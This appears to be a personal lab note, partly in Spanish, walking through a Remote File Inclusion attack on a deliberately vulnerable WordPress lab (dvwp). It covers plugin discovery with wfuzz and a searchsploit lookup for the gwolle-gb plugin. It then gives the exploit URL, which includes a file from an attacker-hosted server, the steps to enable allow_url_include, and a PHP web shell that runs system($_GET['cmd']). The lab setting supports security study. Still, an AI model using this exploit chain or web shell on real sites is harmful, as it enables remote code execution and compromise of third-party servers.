# RFI (Remote FIle Inclusion)

```bash
# download lab and install it
https://github.com/vavkamil/dvwp

# install plugin
gwole

cd /usr/share/seclists

find \
-name \
*plugin*

cd $(dirname ./Discovery/Web-Content/CMS/wp-plugins.fuzz.txt)
cat wp-plugins.fuzz.txt

# use wfuzz to search plugin installed (gwole)

wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://localhost:31337/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000468:   403        9 L      28 W       277 Ch      "wp-content/plugins/akismet/"
000004504:   200        0 L      0 W        0 Ch        "wp-content/plugins/gwolle-gb
                                                        /"                           
000004593:   500        0 L      0 W        0 Ch        "wp-content/plugins/hello.php
                                                        /"                           
000004592:   500        0 L      0 W        0 Ch        "wp-content/plugins/hello.php"

searchsploit gwolle
searchsploit -x php/webapps/38861.txt
# ans
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hacke
rs_website]

In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker 
may still include local files and also execute arbitrary code.

# open python server
python3 -m http.server 80

# open browser and go to
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.9

# set allow_url_include to 1
docker exec -it dvwp_wordpress_1 bash
echo 'allow_url_include = "on"' >> /etc/php/7.4/fpm/php.ini
docker restart dvwp_wordpress_1

```
- En el RFI podmeos levantar n servidor en nuestra maquina y colocarlo en la URL de la pagina. Se puede inyectr un php con el comando cmd:
```php
<?php
    system($_GET['cmd']);
?>

```

- En la url, se concatena el `?cmd=<comando_a_ejecutar>`